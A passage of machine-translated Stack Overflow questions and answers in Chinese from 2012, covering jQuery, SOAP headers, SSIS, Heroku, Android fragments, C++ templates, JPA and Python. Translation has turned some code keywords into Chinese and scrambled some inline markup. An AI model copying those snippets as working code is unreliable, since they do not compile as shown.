        img.attr('src',url);
});
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:36:36.687

您可以使用延迟对象

```
function processData( ) { ... }

$("a#myId").click(function(){

    $(this).append('<img src="loading.gif" />');
    $.when( processData ).then( function( ) { 
        $("img[src='loading.gif']").remove();
    });

}); 
```

# soap - 未发送 jaxws 中的 SOAP 请求中的标头

> ID：13514740
> 
> 赞同：3
> 
> 时间：2012-11-22T14:26:06.530
> 
> 标签：soap, header

我正在尝试使用此代码（如在此论坛中找到）一起发送标头和 SOAP 请求：

公共无效客户端初始化（）{尝试{

```
 service = new User_Service(getURL("http://10.56.100.10:8081/UserServices/UserServices?wsdl"), new QName("http://ws.userservices.sac.com/", "UserServices"));
    port = service.getUserServicesPort();
    WSBindingProvider bp = (WSBindingProvider)port;
    bp.setOutboundHeaders(Headers.create(new QName("simpleHeader"),"username"));
    }
    catch (Exception exception)
    {
    error("Failed to create URL in Online Medition Client: " + exception.getMessage());
    }

   factory=new ObjectFactory(); 
```

但是，Header 仍然没有进入 Request：

POST /SubscriberServices/SubscriberServices HTTP/1.1 Accept: text/xml, multipart/related Content-Type: text/xml; charset=utf-8 SOAPAction：“http://soap.sac.com”用户代理：Metro/2.1 (branches/2.1-6728; 2011-02-03T14:14:58+0000) JAXWS-RI/2.2。 3 JAXWS/2.2 主机：10.56.100.10:8081 连接：保持活动内容长度：826

..................................................... .....................

我也看到有人建议使用：

setOutboundHeaders 中的 Headers.create(jaxbContext,myJaxbObject) ，但我真的不明白这是做什么用的。（我对Java很陌生......）有人可以建议吗？提前非常感谢。

最好的问候，丹

# javascript - 使用 Google Maps API 获取游戏的街道图

> ID：13514748
> 
> 赞同：7
> 
> 时间：2012-11-22T14:26:33.040
> 
> 标签：javascript, google-maps, google-maps-api-3, maps

我是 Google Maps API 的新手，我想开发一款游戏，使用 google 地图上的街道作为路径。我很清楚我需要什么，但我什至不知道在 API 文档中开始搜索什么......

**我怎样才能得到像城市街道或谷歌地图其他部分的图形表示 - 像交叉路口的顶点和边的街道名称（或任何我可以转换成这样的东西），顶点映射到（纬度，经度）坐标点......甚至街道的折线对象，这样我就可以从中提取我想要的东西？（寻路算法肯定可以访问这样的数据结构，所以它就在某个地方，但我如何通过 API 获得它？）**

如果有人尝试编写类似基于谷歌地图的自定义路线查找应用程序，他可能已经完成了从 API 中获取这个数据之王的步骤，所以如果你已经想通了，请分享解决方案...

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-22T14:45:01.150

街道数据不能通过 API 获得，除非它出现在路线服务的输出中。要获取您似乎要求使用的大量数据，您需要找到另一个来源，具体取决于国家/地区，它可能是免费提供的；或者您可以从[OpenStreetMaps](http://www.openstreetmap.org/)获得您需要的东西。

# ssis - SSIS 脚本任务没有因 DTS.TaskResult 而失败

> ID：13514750
> 
> 赞同：3
> 
> 时间：2012-11-22T14:26:36.200
> 
> 标签：ssis

我们要求 SSIS 脚本任务在某些情况下失败

```
If var_status = "Y"
Msgbox("Error Found")
Dts.TaskResult = ScriptResults.Failure
End If 
```

但是当我们运行它时，它会进入 IF 条件，但不会使脚本任务失败。

任何人都可以请建议

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T15:19:06.470

```
If var_status = "Y"
    Msgbox("Error Found")
    Dts.TaskResult = ScriptResults.Failure
    Return
End If 
```

**假设 **ScriptResults.Failure**与**Dts.Results.Failure相同**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-15T14:32:06.560

您可以使用此技术：

尝试 {

```
 //Code goes here that may throw exception or succeed
   Dts.TaskResult = (int)ScriptResults.Success;

}
catch (Exception e)
{

   //Outputs a message to the Output window of SSDT/BIDS
   Dts.Events.FireError(-1, "My Task Name", e.message, String.Empty, 0);

  // Makes a package fail (or intercept in Event Handler)
   Dts.TaskResult = (int)ScriptResults.Failure; 
```

}

# python - 是否可以在 Heroku 上使用不可安装 pip 的模块？

> ID：13514751
> 
> 赞同：1
> 
> 时间：2012-11-22T14:26:40.243
> 
> 标签：python, heroku, mashape

我真的很想在 Heroku 上的应用程序中使用 Mashape python 模块。[https://github.com/Mashape/mashape-python-client-library](https://github.com/Mashape/mashape-python-client-library)

但是我已经尝试过`pip install mashape`，但我无法以这种方式安装它，所以我无法将它放在我的 pip requirements.txt 中，以便在我部署我的应用程序时安装 Heroku。

还有其他方法吗？一般来说，Heroku 应用程序有没有办法使用无法通过 pip 安装的 python 模块（比如从源代码构建）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:56:16.270

您可能有两种使用 mashape 的方法。

首先是将 mashape 作为项目的一部分，并确保该`mashape`目录位于`python path`项目目录中。这样，您就可以`import mashape`照常进行了。

第二种方法是 fork mashape 并`setup.py`在自己的 fork 中为 mashape 编写一个简单的文件。然后，无需将 mashape 上传到 pypi 中，您仍然可以使用`setup.py`您编写并推送到您自己的分叉 github 存储库中的内容安装它，通过 pip 使用类似的东西：

```
`pip install -e git+git://github.com/YourFork/mashape-python-client-library.git#egg=mashape` 
```

`YourFork`你的 github 用户 ID在哪里。

# android - 有什么方法可以使用 Robotium 清除默认共享首选项？

> ID：13514754
> 
> 赞同：2
> 
> 时间：2012-11-22T14:26:42.730
> 
> 标签：android, sharedpreferences, robotium

我的应用使用`PreferenceManager.getDefaultSharedPreferences(getBaseContext())`

然后设置几个偏好值。在运行测试时，我想清除这些值并从已知状态开始。有什么方法可以在函数中设置或初始化默认共享首选项`setUp`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T15:48:27.863

您需要的代码如下：

```
Context context = instrumentation.getTargetContext();
PreferenceManager.getDefaultSharedPreferences(context).edit().clear().commit(); 
```

如果您的应用程序使用任何不同的共享首选项，您可能还需要通过以下方式清除它们：

```
context.getSharedPreferences("XXX", Context.MODE_PRIVATE).edit().clear().commit(); 
```

# c++ - C++ 模板和比较不同的类型

> ID：13514756
> 
> 赞同：1
> 
> 时间：2012-11-22T14:26:47.077
> 
> 标签：c++, templates, template-specialization

我正在尝试使用模板在 C++ 中编写一个通用排序函数，但我坚持编写`greater`返回 true if 的函数`lhs > rhs`

```
template <typename T>
bool Sorter<T>::greater(T lhs, T rhs)
{
    return lhs > rhs;
} 
```

上面的代码将处理简单的类型，例如 int、long。我应该怎么做才能使代码适用于`std::string`, `std::string&`, `const char *`. 代码示例将是一个很大的帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-22T14:31:50.830

我想说你唯一需要担心的是`const char*`，`std::string`应该已经在`operator>`某个地方定义了......（通常在`<string>`）

对于`const char*`，提供专业化.. 例如。

```
template <>
bool Sorter<const char*>::greater(const char* lhs, const char* rhs)
{
  return std::strcmp(lhs, hs) > 0;
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-22T14:32:15.710

您必须将模板专门用于比较不像说的那样直接的类型`lgs>rhs`。

这是我重新编写代码的方式：

```
template <typename T>
bool greater(T const& lhs, T const& rhs)
{
    return lhs > rhs;
} 
```

以下是你如何专攻它：

```
template<>
bool greater<string>(string const& lhs, string const& rhs)
{
     //
} 
```

为简单起见删除了成员资格。

请注意，已经有一个`std::greater`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:32:46.317

所有这些类型都带有比较运算符。请记住，char 只是一个 1 字节的数字。对于字符串，使用字典顺序。

[字符串比较](http://www.cplusplus.com/reference/string/operators/)

# c# - 用户控件和页面之间的数据处理

> ID：13514757
> 
> 赞同：2
> 
> 时间：2012-11-22T14:26:48.203
> 
> 标签：c#, asp.net, controls

尊敬的专家，我在名为 Uc1.axcs 的用户控件上有一个属性命名为

```
 public string ExamApp1
    {
        get { return txtExamAppeared1.Text; }
    } 
```

我已经习惯了另一个用户控件 uc2.axcs

然后在我在页面 test.aspx 中使用了 uc2.axcs 用户控件之后，我的问题是我想在页面 test.aspx 中使用 ExamApp1，如果没有 Find Control 属性，我怎么能这样做是他们重新调整 Uc1 的任何方法来自 uc2 的用户控件通过属性，并通过该属性使用了 ExamApp1 属性

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:31:37.037

您应该能够通过以下方法公开它`uc2`：

```
public string GetExamApp1()
{
    return uc1Instance.ExamApp1;
} 
```

`uc1Instance`控件中用于`uc1`控件实例的 id在哪里`uc2`。

# java - 双向OneToOne关系不对称保存？

> ID：13514760
> 
> 赞同：3
> 
> 时间：2012-11-22T14:26:58.943
> 
> 标签：java, jpa, orm, relation, ebean

如果在关系上使用 PERSIST 级联类型，在所有者侧或另一侧保存实体有什么区别？

```
@Entity
public class Slot {
    @OneToOne(mappedBy = "slot", cascade={CascadeType.PERSIST, CascadeType.MERGE, CascadeType.REFRESH})
    private Cartridge cartridge;
}

@Entity
public class Cartridge {
    @OneToOne(cascade={CascadeType.PERSIST, CascadeType.MERGE, CascadeType.REFRESH})
    private Slot slot;
} 
```

问题：

```
slot.setCartridge(cartridge);
slot.save(); 
```

对比

```
cartridge.setSlot(slot)
cartridge.save(); 
```

slot.save() 或弹药筒.save() 似乎不一样...

两个实体都已保存。我只是想设置它们之间的关系。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T15:53:04.650

Cartridge 拥有该关系，这意味着必须为要在大多数提供程序中更新的外键设置 Cartridge.slot 值。JPA 规范还指出，您应该维护双向关系的双方，以使它们与数据库中的内容保持同步 - 因此，如果您的 setCartridge 也没有以某种方式设置关系的另一方，那么当您下次读取墨盒时，它可能没有设置插槽。JPA 取消了旧 EJB 规范中的关系维护，使实体的行为尽可能地像常规 Java 对象。

你应该调用类似的东西：

```
slot.setCartridge(cartridge);
cartridge.setSlot(slot) 
```

然后保存在插槽或墨盒上 - 它不重要，因为合并将在任一方向级联到引用的对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T16:24:03.027

是的，JPA 可能就像 Chris 所说的那样工作，也就是说，您应该通过同时设置双方来保持关系的最新状态。

但是，恕我直言，最好通过限制 API 来防止此问题。*设置器应该只在关系所有者端实现。*这样就没有办法从另一边更改值，无论如何都会被 ORM 忽略。

在您当前的示例中，这意味着 Cartridge 应该实现该`setSlot()`方法，而 Slot 不应该具有该`setCartridge()`方法。（不过，您可能做得更好，让 slot 成为所有者。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:36:26.680

在我看来，有一个区别。当您使用父对象保存实体时，**它首先插入父实体，然后在保存子实体之前将生成的密钥分配给子实体。**

当您先保存子实体时，它会不一样。

# c# - 在自定义控件中渲染 LinkBut ton

> ID：13514761
> 
> 赞同：0
> 
> 时间：2012-11-22T14:27:07.440
> 
> 标签：c#, asp.net

我正在创建一个带有如下标记的自定义控件：

```
<Custom:CustomGrid>
    <Columns>
        <Custom:DataColumn HeaderText="FirstName" />
        <Custom:DataColumn HeaderText="LastName" />
    </Columns>
</Custom:CustomGrid> 
```

为了分别呈现外部 Div/Table 和 Column 标签，我将同时覆盖 Render 和 RenderChildren。

我希望每个 TH 都包含一个 LinkBut​​ton，`HeaderText`用于排序。我创建了一个`foreach`循环来运行列集合，并为每个列创建一个 TH，其中包含一个 LinkBut​​ton。我使用渲染出 LinkBut​​ton`linkBtn.RenderControl(writer);`

我在 html 中得到的只是一个空的锚标记。我猜这是因为当它以这种方式呈现时，asp.net 不知道呈现服务器控件的 JS 端。但我不知道我能做些什么不同的事情。有任何想法吗？

**编辑：**我可以看到创建了 href="javascript:_doPostBack('myGrid$Sort_firstName','')" 。我不知道为什么字符被 html 转义，但我猜它只是 html 源查看器（或者可能不是......）无论如何，事件处理程序仍然没有被触发。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T18:52:19.540

原来 CreateChildControls 不是创建子控件的地方......（谁会想到它......）

我将将控件添加到控件集合的代码移到了 OnInit 中，并且一切都正确运行。

事实证明，在生命周期中调用 CreateChildControls 为时已晚，无法正确路由事件。

# ssis - 在 foreach 循环中获取最旧的文件

> ID：13514762
> 
> 赞同：3
> 
> 时间：2012-11-22T14:27:08.557
> 
> 标签：ssis, foreach-loop-container

我在具有命名约定的文件夹中有多个文件

```
Name_MoreName_DDMMYYYY_SomeNumber_HHMMSS.txt 
```

如何在具有最旧日期和时间（即最旧的 DDMMYYYY 和 HHMMSS）的 foreach 循环中只获取一个文件。我被限制使用 foreach 循环。

前任：

*   Name_MoreName_22012012_SomeNumber_072334.txt
*   Name_MoreName_22012012_SomeNumber_072134.txt
*   Name_MoreName_24012012_SomeNumber_072339.txt
*   Name_MoreName_22012012_SomeNumber_072135.txt

所以最旧的文件将是

```
Name_MoreName_22012012_SomeNumber_072134.txt 
```

我怎样才能只取最旧的文件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T10:45:14.007

日期表达式：

**SUBSTRING(@[User::Filename], FINDSTRING(@[User::Filename],"_", 2) +1, 8)**

最旧日期表达式：

**(DT_I4) (RIGHT(@[User::Date], 4)+ SUBSTRING(@[User::Date], 3,2)+ SUBSTRING(@[User::Date],1, 2))**

脚本任务 - 我

```
Public Sub Main()
        Dim OldestDate As Integer
        Dim CurrentDate As Integer
        OldestDate = CType(Dts.Variables("OldestDate").Value, Integer)
        CurrentDate = CType(Dts.Variables("CurrentDate").Value, Integer)
        If OldestDate > CurrentDate Then
            Dts.Variables("OldestFile").Value = Dts.Variables("Filename").Value.ToString()
            Dts.Variables("CurrentDate").Value = CType(Dts.Variables("OldestDate").Value, Integer)
        End If
        Dts.TaskResult = Dts.Results.Success
    End Sub 
```

脚本任务 - II

```
Public Sub Main()
        MsgBox(Dts.Variables("OldestFile").Value.ToString())
        Dts.TaskResult = Dts.Results.Success
End Sub 
```

![在此处输入图像描述](../Images/37ecc7e723d00a61b3cd998bd85ec8b9.png)

**解释：**

这里的基本思想是获取日期部分，即 DDMMYYYY 并将其转换为 YYYYMMDD。现在，只要日期是 YYYYMMDD 格式，我们就可以通过简单的整数比较来比较哪个日期更大。我们首先将第一个文件的日期与**19000101**（过去的日期）进行比较，然后如脚本任务中所示 - 我，我们有条件地为OldestFile**分配****文件名**。**脚本任务 - II**打印出日期最早的文件名。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T00:12:24.193

现有的 Foreach (file) Enumerator 在这种情况下是不够的，因为它仅限于文件名掩码。根据您的需要，您正在查看一个脚本任务来填充*某些内容。*无论这只是一个变量，然后用于配置平面文件连接管理器的 ConnectionString 属性，还是您是否需要生成所有旧文件的列表（以防您需要识别 Name_MoreName_OldestDate 和 Name_OtherName_OldestDate），将其分配给一个变量然后使用 Foreach 枚举器（变量）将取决于您的确切业务需求。

如果您可以使用修改后的日期/时间，那么这个答案将是这个答案中逻辑的反转 [Import latest csv file to sql server in ssis](https://stackoverflow.com/questions/8831060/import-most-recent-csv-file-to-sql-server-in-ssis/8838029#8838029) 否则，类似的逻辑没有 LINQ 的乐趣。使用 DirectoryInfo 调用浏览文件夹中的所有文件，然后比较文件名。

如果您需要更详细的解释，请告诉我。

# android-layout - 我可以使用多少种布局？

> ID：13514765
> 
> 赞同：2
> 
> 时间：2012-11-22T14:27:17.307
> 
> 标签：android-layout

我是 android 开发的新手，我有一个关于布局的简单问题。如果我想创建类似基于文本的游戏。就像有一段文本和一些移动到不同页面的按钮一样。我如何使它工作？我的想法是创建很多布局。因为它下面的文本和按钮会随着每一页而改变。但我可以这样做吗？太多的布局不会占用太多的内存或类似的东西吗？我可以摆脱大约**200 个**布局吗？像这样工作会很容易。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T11:34:23.173

在我看来，布局文件不是描述游戏逻辑的好选择。

也许你的应用只需要一种布局（基本上你只描述了一个屏幕）并用不同的数据填充它（文本也可以动态设置）。

为了*编写*游戏脚本，您可以发明一种简单的文件格式（如果您愿意，也可以是 xml）并定义游戏的屏幕以及它们之间的连接。

如果您要实现的所有屏幕仅在某些按钮上有所不同，则通常不值得为每个屏幕创建单独的布局。您可以使用 View 的方法更改按钮的可见性，`setVisibility(int)`并设置不同的 OnClickListener 以引导到其他屏幕。

您还可以调查重用和包括布局：http: [//developer.android.com/training/improving-layouts/reusing-layouts.html](http://developer.android.com/training/improving-layouts/reusing-layouts.html)

和 ViewStubs：http: [//developer.android.com/reference/android/view/ViewStub.html](http://developer.android.com/reference/android/view/ViewStub.html)

# html - 将内容“粘贴”到底部页面，而不是视口，具有自动高度

> ID：13514772
> 
> 赞同：1
> 
> 时间：2012-11-22T14:27:37.037
> 
> 标签：html, css, positioning

我的新页面[链接](http://test.junx.cz)有问题 我需要最小高度的页面：100％，因为我希望页面底部有内容，页面在大视口中，然后内容不在底部，当我使用一些原因就像`html, body { height: 100% }`有问题的内容超出了顶部导航，页面只有 100%[的链接和更多的文字](http://test.junx.cz/contact.html)高度......我不知道更多......

存在方法，该内容粘在底部页面，但整个页面的高度是自动的？

谢谢， 皮克利斯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T15:09:07.523

在您的情况下，当页面高度为 100% 或更低时，您希望页脚 t 贴在底部，但您还希望内容推动您的页脚，以防有更多内容。这是不能共存的 2 个不同的 css 规则。我建议您在 div #content 的末尾添加 150px 边距，并将页脚设置为 position:fixed 而不是 absolute。我知道这并不完全是您想要的结果，但它是解决问题的最简单方法。如果您真的希望您的内容推动页脚，则必须使用 js 检测高度，如果 >100% 则更改您的 css 规则。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T15:54:16.727

如果我理解正确你想要一个粘性页脚所以我建议尝试这个[链接](http://www.cssstickyfooter.com/)！

如果使用 HTML 5，您可以将页脚 div 更改为使用页脚元素（相应地更改 css）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:33:39.767

如果您需要将内容卡在底部，请在您的 CSS 中使用`position: absolute; bottom: 0px;`它`div`（不要`position:relative`放在`body`. 忘记强迫身体`height`。

# google-analytics - 使用谷歌分析 API 为 Web 应用程序的客户显示数据子集

> ID：13514775
> 
> 赞同：2
> 
> 时间：2012-11-22T14:27:39.070
> 
> 标签：google-analytics, google-analytics-api

我正在开发一个与hotels.com 或yell.com 类似的想法的应用程序 - 即，每个“企业”都有自己的页面：

例如 www.website.com/companies/contoso-13443

因此，Contoso 将登录到后端系统。其中一个选项是“查看页面分析”
所以在这里，我想显示该特定页面的访问次数（也许还有一些来自谷歌分析可用数据的其他位）。

有没有办法使用 Google Analytics API 做到这一点？

即-在我的整个站点上设置它，然后允许登录的站点访问一个很小的子集（通过 api，所以我可以设置它的样式/以不同的格式呈现它等等……）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T17:22:31.110

您可以使用以下方式过滤您的 GA API 查询（请参阅[过滤器语法](https://developers.google.com/analytics/devguides/reporting/core/v3/reference#filterSyntax)）：

```
filters=ga:pagePath=~/companies/contoso* 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-01T00:35:24.640

是的 - 使用自定义变量。您必须修改 GA 跟踪代码并根据客户的页面添加它。如果您正在寻找无需学习 GA API 的解决方案，请查看[embeddedanalytics.com](http://www.embeddedanalytics.com)。我们已经与许多 CMS 提供商合作。（如果您有兴趣 - 通过电子邮件查询）。

# android - 访问片段中 ListView 中的单选按钮（从另一个片段获取更新）

> ID：13514778
> 
> 赞同：1
> 
> 时间：2012-11-22T14:28:00.227
> 
> 标签：android, listview, android-fragments

我在一个活动中有两个（列表-）片段。当在左侧Fragment中选择一行时，我在右侧Fragment中显示一些数据，这也是一个ListView。此视图的一行包含一个 TextView 和三个 RadioButtons。

我的目标是获取这些按钮，fe 来设置值并设置 onClickListener。

我的问题是，我在右侧 Fragment 中的 onItemSelected() 不起作用，但我不知道为什么。我尝试从 ListFragment （作为左 Fragment）以及具有自定义 ID 的 ListView 中扩展。

*   我必须从 ListFragment 扩展还是与普通 ListView 一样？
*   我是否必须使用 onActivityCreate 来设置 onClickListener？

这段代码是多次尝试从不同帖子中尝试一些代码的产物。我看到有一些错误。

这是我的左侧片段：

```
public class HeaderListFragment extends ListFragment {
private final static String TAG = "HeaderListFragment";
List<ChecklistItem> header;
static ArrayList<HashMap<String,String>> list = new ArrayList<HashMap<String,String>>();

private DBManager db_manager;
private SimpleAdapter simpleAdapter;

//getstring -> BUG
String[] from = { "number","text" };
int[] to = { R.id.listele_header_no, R.id.listele_header_text};

public void buildList(){
    Log.v(TAG, "buildList");
    list = new ArrayList<HashMap<String,String>>();
    for (ChecklistItem item : header){
        HashMap<String, String> map = new HashMap<String, String>();
        map.put("number", item.getnumber());
        map.put("text", item.gettext());        
        list.add(map);
    }
}

@Override
public void onListItemClick(ListView l, View v, int position, long id) {
    super.onListItemClick(l, v, position, id);

    updateDetail(header.get(position).getparent_id());
}

@Override
public void onAttach(Activity activity) {
    // TODO Auto-generated method stub
    super.onAttach(activity);
}

@Override
  public View onCreateView(LayoutInflater inflater, ViewGroup container,
      Bundle savedInstanceState) {
    View view = inflater.inflate(R.layout.headerfragment,
        container, false);

    db_manager = new DBManager(getActivity().getContentResolver());

    header = db_manager.getItemHeader();
    Log.v(TAG, "HEADER LIST SIZE "+header.size());

    buildList();

    simpleAdapter = new SimpleAdapter(getActivity(),
            list,
            R.layout.headeritem_row,
            from,
            to);
    setListAdapter(simpleAdapter);
    Log.v(TAG, "set adapter");

    return view;
  }

  // May also be triggered from the Activity
  public void updateDetail(int id) {

    QuestionListFragment fragment = (QuestionListFragment) getFragmentManager()
        .findFragmentById(R.id.questionFragment);
    if (fragment != null && fragment.isInLayout()) {
      fragment.setUI(id);
    } 
```

我的正确片段：

```
public class QuestionListFragment extends ListFragment {
private final static String TAG = "QuestionListFragment";

List<ChecklistItem> questions;
static ArrayList<HashMap<String,String>> list = new ArrayList<HashMap<String,String>>();
private DBManager db_manager;
private SimpleAdapter simpleAdapter;
private ProgressDialog dialog;
private RadioGroup radioGroup;
private RadioButton yes, na, open;
private ListView listview;

//getstring -> BUG
String[] from = { "number","text" };
int[] to = { R.id.listele_question_no, R.id.listele_question_text};

public void buildList(){
    Log.v(TAG, "buildList");
    list = new ArrayList<HashMap<String,String>>();
    for (ChecklistItem item : questions){
        Log.v(TAG, item.gettext());
        HashMap<String, String> map = new HashMap<String, String>();
        map.put("number", item.getnumber());
        map.put("text", item.gettext());        
        list.add(map);
    }
}

@Override
public void onAttach(Activity activity) {
    // TODO Auto-generated method stub
    super.onAttach(activity);
}

 @Override
  public View onCreateView(LayoutInflater inflater, ViewGroup container,
      Bundle savedInstanceState) {
    View view = inflater.inflate(R.layout.questionfragment,
        container, false);

    Log.v(TAG, "onCreateView");

    db_manager = new DBManager(getActivity().getContentResolver());
    return view;
  }

 @Override
public void onActivityCreated(Bundle savedInstanceState) {
    super.onActivityCreated(savedInstanceState);
    Log.v(TAG, "onActivityCreated");
    listview = getListView();
    listview.setOnItemClickListener(new OnItemClickListener() {

            @Override
            public void onItemClick(AdapterView<?> arg0, View arg1, int position,
                    long arg3) {

                Log.d(TAG, "--> onItemClick listener..."); // You should see this now

                }*/
            }});
}

  public void setUI(Integer parent_id) {
      Log.v(TAG, "setUI");

      questions = db_manager.getQuestions(parent_id);
      buildList();
      simpleAdapter = new SimpleAdapter(getActivity(),
                list,
                R.layout.questionitem_row,
                from,
                to);

        listview.setAdapter(simpleAdapter);
        setListAdapter(simpleAdapter);
        Log.v(TAG, "set adapter"); 
```

有了您的反馈，它就起作用了！这是我的代码：

```
public class QuestionListFragment extends ListFragment {
private final static String TAG = "QuestionListFragment";

List<ChecklistItem> questions;
static ArrayList<HashMap<String,String>> list = new ArrayList<HashMap<String,String>>();
private DBManager db_manager;
private ProgressDialog dialog;
private ListViewCustomAdapter adapter;

public void buildList(){
    Log.v(TAG, "buildList");
    list = new ArrayList<HashMap<String,String>>();
    for (ChecklistItem item : questions){
        Log.v(TAG, item.gettext());
        HashMap<String, String> map = new HashMap<String, String>();
        map.put("number", item.getnumber());
        map.put("text", item.gettext());        
        list.add(map);
    }
}

@Override
public void onAttach(Activity activity) {
    super.onAttach(activity);
}

 @Override
  public View onCreateView(LayoutInflater inflater, ViewGroup container,
      Bundle savedInstanceState) {
    View view = inflater.inflate(R.layout.questionfragment,
        container, false);

    Log.v(TAG, "onCreateView");

    db_manager = new DBManager(getActivity().getContentResolver());

    return view;
  }

 @Override
public void onActivityCreated(Bundle savedInstanceState) {
    super.onActivityCreated(savedInstanceState);
    Log.v(TAG, "onActivityCreated");

    getListView().setOnItemClickListener(new OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> arg0, View arg1, int position,
                    long arg3) {
                Log.d(TAG, "--> onItemClick listener..."); 
            }});

}

  public void setUI(Integer parent_id) {
      Log.v(TAG, "setUI");

      questions = db_manager.getQuestions(parent_id);
      buildList();  
      adapter = new ListViewCustomAdapter(getActivity(), (ArrayList) questions);
      setListAdapter(adapter);
      Log.v(TAG, "set adapter");

  }

  public class ListViewCustomAdapter extends BaseAdapter{
        ArrayList<ChecklistItem> itemList;
        public Activity context;
        public LayoutInflater inflater;

        public ListViewCustomAdapter(Activity context, ArrayList<ChecklistItem> itemList) {
            super();
            this.context = context;
            this.itemList = itemList;
            this.inflater = (LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        }

        @Override
        public int getCount() {
            return itemList.size();
        }

        @Override
        public Object getItem(int position) {
            return itemList.get(position);
        }

        @Override
        public long getItemId(int position) {
            return 0;
        }

        public class ViewHolder
        {
            TextView number;
            TextView text;
            RadioButton yes,na,open;
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {

            final int pos = position;

            ViewHolder holder;
            if(convertView==null)
            {
                holder = new ViewHolder();
                convertView = inflater.inflate(R.layout.questionitem_row, null);

                holder.text = (TextView) convertView.findViewById(R.id.listele_question_text);
                holder.number = (TextView) convertView.findViewById(R.id.listele_question_no);
                holder.yes = (RadioButton)convertView.findViewById(R.id.rb_yes);

                RadioButton rb = (RadioButton)convertView.findViewById(R.id.rb_yes);
                rb.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Log.v(TAG, "yes");
                        Log.v(TAG, questions.get(pos).gettext());
                    }
                });

                holder.yes = rb;

                convertView.setTag(holder);
            }
            else
                holder=(ViewHolder)convertView.getTag();
                ChecklistItem item = (ChecklistItem) itemList.get(position);
                holder.text.setText(item.gettext());
                holder.number.setText(item.getnumber());
                return convertView;
       }
  } 
```

# ssl - 添加 SSL 层会增加响应时间吗？

> ID：13514784
> 
> 赞同：0
> 
> 时间：2012-11-22T14:28:21.350
> 
> 标签：ssl, load-testing

1.  与没有 SSL 层的相同页面相比，具有 SLL 层的页面的响应时间是否会增加？

2.  如果是，那是添加 SSL 层加密的原因吗？还有什么我错过的吗？

3.  仅对于主页，无需登录到应用程序，我们是否需要对我们的页面进行 SSL 层？

更好理解：为什么我们没有[http://www.facebook.com](http://www.facebook.com)的 SSL 层。

如果 FB 是对的，那么为什么我们为 www.gmail.com 的主页设置 SSL 层？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T20:07:46.337

1.  当然。

2.  加密加上握手加上可能的空间开销。

3.  不，但如果页面中有登录表单，这是习惯性的，以提供密码将被加密的视觉保证。

4.  “我们”没有用于 gmail.com 的 SSL。Gmail 可以。如果您想知道为什么他们的网站是这样构建的，请询问他们。

# python - 写入文件并获得奇怪的缩进

> ID：13514786
> 
> 赞同：0
> 
> 时间：2012-11-22T14:28:27.790
> 
> 标签：python

我有以下代码片段，它需要一个 url 打开它，只解析文本，然后搜索小部件。它检测小部件的方法是查找单词`widget1`then `endwidget`，它表示小部件的结束。

基本上，代码在找到单词后立即将所有文本行写入文件，`widget1`并在读取时结束`endwidget`。但是，我的代码在第一行之后缩进所有`widget1`行。

这是我的输出

```
widget1 this is a really cool widget
       it does x, y and z 
       and also a, b and c
       endwidget 
```

我想要的是：

```
widget1 this is a really cool widget
it does x, y and z 
and also a, b and c
endwidget 
```

为什么我得到这个缩进？这是我的代码...

```
 for url in urls:
        page = mech.open(url)
        html = page.read()
        soup = BeautifulSoup(html)
        text= soup.prettify()
        texts = soup.findAll(text=True) 

        def visible(element):
            if element.parent.name in ['style', 'script', '[document]', 'head', 'title']: 
            # If the parent of your element is any of those ignore it

                return False

            elif re.match('<!--.*-->', str(element)):
            # If the element matches an html tag, ignore it

                return False

            else:
            # Otherwise, return True as these are the elements we need

              return True

        visible_texts = filter(visible, texts)

        inwidget=0
        # open a file for write
        for line in visible_texts:
        # if line doesn't contain .widget1 then ignore it
            if ".widget1" in line and inwidget==0:
                match = re.search(r'\.widget1 (\w+)', line)
                line = line.split (".widget1")[1]   
                # make the next word after .widget1 the name of the file
                filename = "%s" % match.group(1) + ".txt"
                textfile = open (filename, 'w+b')
                textfile.write("source:" + url + "\n\n")
                textfile.write(".widget1" + line)
                inwidget = 1
            elif inwidget == 1 and ".endwidget" not in line:
                print line
                textfile.write(line)
            elif ".endwidget" in line and inwidget == 1:
                textfile.write(line)
                inwidget= 0
            else:
                pass 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:45:16.297

您在除第一行之外的所有行中都获得此缩进的原因是因为您编辑该行的第一行是`textfile.write(".widget1" + line)`您直接从包含缩进的 html 文件中获取的其余行。您可以通过在行上使用[str.strip()](http://docs.python.org/2/library/stdtypes.html#str.strip)来删除不需要的空格并更改`textfile.write(line)`为`textfile.write(line.strip())`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:34:42.000

要从您的输出转到您想要的输出，请执行以下操作：

```
#a is your output
a= '\n'.join(map(lambda x: x.strip(),a.split('\n'))) 
```

# android - 关于 PocketSphinxAndroidDemo

> ID：13514793
> 
> 赞同：1
> 
> 时间：2012-11-22T14:28:54.783
> 
